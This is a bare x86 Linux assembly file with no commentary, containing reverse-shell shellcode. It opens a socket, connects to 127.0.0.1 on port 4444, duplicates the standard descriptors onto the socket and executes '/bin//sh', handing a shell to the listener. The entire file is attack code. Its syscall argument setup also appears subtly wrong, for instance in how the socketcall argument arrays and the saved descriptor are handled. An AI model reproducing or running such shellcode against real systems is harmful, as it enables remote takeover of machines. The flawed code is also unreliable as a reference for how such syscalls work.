section .data
    ip db 127, 0, 0, 1
    port dw 0x5c11

section .text
    global _start

_start:
    xor eax, eax
    push eax
    push byte 0x66
    mov al, 0x66
    mov ecx, esp
    xor ebx, ebx
    mov bl, 0x1
    int 0x80
    mov esi, eax
    mov eax, 0x66
    push eax
    mov al, 0x66
    xor ecx, ecx
    push dword [ip]
    push word [port]
    push word 0x2
    mov ecx, esp
    mov ebx, esi
    mov bl, 0x3
    int 0x80
    xor ecx, ecx
    mov cl, 0x2
    mov ebx, esi
    mov al, 0x3f
dup_loop:
    int 0x80
    dec ecx
    jns dup_loop
    xor eax, eax
    push eax
    push dword 0x68732f2f
    push dword 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov al, 0xb
    int 0x80
